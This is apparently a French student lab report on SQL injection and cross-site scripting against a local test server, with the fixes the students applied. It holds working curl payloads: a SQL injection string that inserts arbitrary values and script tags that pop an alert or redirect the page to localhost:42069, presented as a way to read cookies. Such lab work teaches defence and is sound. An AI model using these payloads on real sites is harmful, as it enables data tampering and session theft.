# Rendu "Injection"

## Binome

Nom, Prénom, email: DEMEULENAERE Enzo enzo.demeulenaere.etu@univ-lille.fr
Nom, Prénom, email: BAHOUS Djilali djilali.bahous.etu@univ-lille.fr


## Question 1

* Quel est ce mécanisme? Le mécanisme mis en place consiste à passer une expression régulière sur la chaîne de caractère, regarder si des caractères autres qu'alphanumériques furent entrés. S'il y en a, la chaîne de caractères est refusée. 

* Est-il efficace? Pourquoi? 
Ce mécanisme est en partie efficace en raison du fait qu'il nous restreint à n'écrire que des caractères alphanumériques et empêche l'écriture de code. En revanche, pour un utilisateur malicieux, on peut imaginer l'envoi d'un paquet artificiel contenant les mêmes métadonnées que l'envoi de chaîne, mais contournant ainsi le regex. 
## Question 2

* Votre commande curl

curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080/" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie="Valeur du cookie"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=malice et subterfuges&submit=OK"


## Question 3

* Votre commande curl qui va permettre de rajouter une entree en mettant un contenu arbutraire dans le champ 'who'
curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080/" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie="Valeur du cookie"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=malice et subterfuges','macron') -- &submit=OK"

* Expliquez comment obtenir des informations sur une autre table

## Question 4

Rendre un fichier server_correct.py avec la correction de la faille de
sécurité. Expliquez comment vous avez corrigé la faille.

Cette faille a été corrigée en appliquant la regex prévue sur le serveur, une fois la chaine récupérée. Ainsi, même en utilisant la commande curl, nous devons respecter la regex pour inserer un element dans la table, bloquant ainsi les injections SQL

## Question 5

* Commande curl pour afficher une fenetre de dialog. 

curl "http://localhost:8080/" --data-raw "chaine=<script>alert('Salam')</script> &submit=OK"

* Commande curl pour lire les cookies

curl "http://localhost:8080/" --data-raw "chaine=<script>document.location='http://localhost:42069'</script> &submit=OK"

## Question 6

Rendre un fichier server_xss.py avec la correction de la
faille. Expliquez la demarche que vous avez suivi.

Nous avons echappé toutes les chaines de caractères qui pourront être envoyées en tant que requêtes sql.
Ainsi, aucune chaine de caractère ne correspondra à du code et le navigateur affichera le caractère correspondant au code html.


